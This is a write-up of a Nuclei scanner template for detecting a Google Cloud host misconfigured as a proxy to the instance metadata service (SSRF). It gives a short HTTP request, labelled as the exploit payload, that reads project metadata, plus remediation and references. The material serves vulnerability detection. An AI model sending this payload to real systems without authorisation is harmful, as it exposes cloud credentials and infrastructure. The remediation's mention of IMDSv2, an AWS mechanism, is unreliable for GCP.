# Nuclei Template: Google GCP Metadata Service Check
**Template ID:** metadata-service-gcp
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Critical
**CWE:** CWE-441
**Source:** Nuclei Template (`metadata-google.yaml`)

## Vulnerability Information & PoC

## Description
The Google cloud (GCP) host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.

## Steps to reproduce / Exploit Payload
```http
GET http://{{hostval}}/computeMetadata/v1/project/ HTTP/1.1
Host: {{hostval}}
Metadata-Flavor: Google
```

## Remediation
Disable the proxy or restrict configuration to only allow access to approved hosts/ports. Upgrade to IMDSv2 if possible.

## References
- https://cloud.google.com/compute/docs/metadata/default-metadata-values
- https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
- https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
